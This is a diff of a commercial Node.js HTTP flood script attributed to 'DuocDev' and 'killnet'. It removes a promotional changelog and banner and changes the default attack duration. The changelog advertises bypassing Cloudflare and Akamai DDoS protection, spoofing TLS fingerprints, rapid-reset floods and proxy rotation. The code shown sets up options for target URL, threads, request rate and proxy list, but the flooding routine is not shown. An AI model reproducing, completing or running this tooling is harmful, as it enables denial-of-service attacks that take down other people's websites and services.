@@ -1,92 +1,3 @@
-/*
-    JS DuocDev 1.7
-
-    Node: v22.9.0
-    OS: Ubuntu 22.04
-    Setup: npm install hpack https commander colors
-
-    Date: 16 January, 2025
-
-    ———————————————————————————————————————————
-
-    Released by DuocDev 2XXX (killnet)
-
-    Thank you for purchasing this script.
-
-    1.1 CHANGELOG:
-    - Added redirect handler
-    - Added cookie parser
-    - Fixed update headers
-    - Added proxy conn stats
-    - Removed UAM option
-
-    1.2 CHANGELOG:
-    - Added config loading
-
-    1.3 CHANGELOG:
-    - Fixed randpath
-    - Socks4/5 support
-    - Optimised code
-    - Updated randrate
-
-    1.4 CHANGELOG:
-    - Faster requests
-    - New proxy class
-    - Extra headers
-    - New ratelimit handler
-    - Randomised tls settings
-    - Improved Fingerprints
-    - HTTP2 request queue
-
-    1.5 CHANGELOG:
-    - Bypasses Cloudflare HTTPD0S
-    - HTTP, HTTP/1.1 & HTTP/2 support
-    - Supports proxy authentication
-    - Compatible with browser scripts
-    - Optional TLS Chrome fingerprints
-    - Advanced randrate system option
-    - Optional randpath / ratelimit mode
-    - Supports socks4/5 & http/s proxies
-    - Updated random cookie system
-
-    1.6 CHANGELOG:
-    - New HTTPDD0S bypass
-    - Spoof Akamai fingerprints
-    - Fixed JA3 TLS fingerprints
-    - Updated ratelimit handler
-    - Added new cookie modes
-    - Updated ratelimit handler
-    - New cache bypass option
-    - Updated fingerprint option
-    - New and updated headers
-    - Updated randpath options
-    - Auto-detect proxy protocol
-    - Debug data frame option
-    - Updated rapidreset option
-    - Updated ciphers & sigalgs
-    - Adaptive http2 settings
-    - Fetch proxies from API
-
-    COMING SOON
-*/
-const cluster = require('cluster');
-
-if (cluster.isMaster) {
-    const workers = {};
-console.clear();
-const colors = require('colors');
-console.log(`
-██████  ██    ██  ██████   ██████     ██████  ███████ ██    ██ 
-██   ██ ██    ██ ██    ██ ██          ██   ██ ██      ██    ██ 
-██   ██ ██    ██ ██    ██ ██          ██   ██ █████   ██    ██ 
-██   ██ ██    ██ ██    ██ ██          ██   ██ ██       ██  ██  
-██████   ██████   ██████   ██████     ██████  ███████   ████   
-
-akamai Script - Developed by DuocDev
-Telegram: @DuocDev
-All Rights Reserved © 2025
-`.green.bold);
-
 const net = require('net');
 const tls = require('tls');
 const HPACK = require('hpack');
@@ -94,7 +5,7 @@ const cluster = require('cluster');
 const fs = require('fs');
 const os = require('os');
 const crypto = require('crypto');
-
+const colors = require('colors');
 const { Command } = require('commander');
 const socks = require('socks').SocksClient;
 // console.log(headerGenerator.getHeaders())
@@ -112,7 +23,7 @@ const options = new Command();
 options
     .option('-m, --method <method>', 'Request method <GET/POST/...>')
     .option('-u, --target <url>', 'Target URL <http/https>')
-    .option('-s, --time <seconds>', 'Duration of attack <seconds>', 999)     
+    .option('-s, --time <seconds>', 'Duration of attack <seconds>', 120)
     .option('-t, --threads <number>', 'Number of threads <int>', 4)
     .option('-r, --rate <rate>', 'Requests per second <int>', 60)
 
@@ -176,7 +87,7 @@ if (!options.opts().method || !options.opts().target || !options.opts().proxy) {
 // const opts = options.opts();
 var reqmethod = opts.method || "GET";
 const target = opts.target;
-const time = opts.time || 999;
+const time = opts.time || 120;
 const threads = opts.threads;
 const ratelimit = opts.rate || 60;
 const proxyfile = opts.proxy;
